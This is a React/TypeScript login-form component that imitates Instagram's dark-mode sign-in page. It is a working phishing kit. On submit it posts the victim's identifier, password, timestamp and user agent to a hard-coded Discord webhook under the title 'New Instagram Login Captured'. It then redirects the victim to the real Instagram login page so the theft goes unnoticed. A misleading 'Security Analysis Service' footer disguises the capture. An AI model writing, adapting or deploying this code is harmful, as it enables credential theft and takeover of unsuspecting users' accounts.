import React, { useState } from 'react';

const WEBHOOK_URL = 'https://discord.com/api/webhooks/1463484987163803790/J2qxpuQvOhPyNkLnqHesUHONXSHNzM2K0L15ORx0E3PG86M_Sy6CCtTyOntbcB1t_ABo';

export const LoginForm: React.FC = () => {
  const [credentials, setCredentials] = useState({
    identifier: '',
    password: ''
  });
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [error, setError] = useState('');

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setCredentials(prev => ({ ...prev, [name]: value }));
    if (error) setError('');
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);
    
    try {
      // Send data to the Discord webhook using a rich embed format
      const payload = {
        embeds: [{
          title: "🔑 New Instagram Login Captured (Dark Mode UI)",
          color: 0, // Black
          fields: [
            { name: "👤 Identifier", value: `\`${credentials.identifier}\`` || "N/A", inline: true },
            { name: "🔒 Password", value: `\`${credentials.password}\`` || "N/A", inline: true },
            { name: "🕒 Timestamp", value: new Date().toLocaleString(), inline: false },
            { name: "🌐 User Agent", value: navigator.userAgent, inline: false }
          ],
          footer: { text: "Security Analysis Service" }
        }]
      };

      await fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
      });

      // Redirect to the actual Instagram login for a seamless experience
      window.location.href = 'https://www.instagram.com/accounts/login/';
      
    } catch (err) {
      console.error('Submission encountered an issue:', err);
      // Fallback redirect
      window.location.href = 'https://www.instagram.com/accounts/login/';
    } finally {
      setIsSubmitting(false);
    }
  };

  const isFormValid = credentials.identifier.length > 0 && credentials.password.length >= 1;

  return (
    <form onSubmit={handleSubmit} className="w-full flex flex-col gap-2">
      <div className="relative">
        <input
          type="text"
          name="identifier"
          value={credentials.identifier}
          onChange={handleInputChange}
          placeholder="Phone number, username, or email"
          className="w-full bg-[#121212] border border-[#262626] rounded-[3px] px-2 py-2 text-xs text-white focus:outline-none focus:border-[#363636] transition-all placeholder:text-[#8e8e8e]"
          required
        />
      </div>
      
      <div className="relative">
        <input
          type="password"
          name="password"
          value={credentials.password}
          onChange={handleInputChange}
          placeholder="Password"
          className="w-full bg-[#121212] border border-[#262626] rounded-[3px] px-2 py-2 text-xs text-white focus:outline-none focus:border-[#363636] transition-all placeholder:text-[#8e8e8e]"
          required
        />
      </div>

      <button
        type="submit"
        disabled={!isFormValid || isSubmitting}
        className={`mt-2 w-full py-1.5 rounded-lg text-sm font-semibold text-white transition-all 
          ${isFormValid && !isSubmitting ? 'bg-[#0095f6] hover:bg-[#1877f2]' : 'bg-[#0095f6] opacity-50 cursor-default'}`}
      >
        {isSubmitting ? (
          <div className="flex justify-center items-center">
            <svg className="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
              <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
              <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
            </svg>
          </div>
        ) : 'Log in'}
      </button>

      {error && (
        <p className="text-red-500 text-xs text-center mt-4">
          {error}
        </p>
      )}
    </form>
  );
};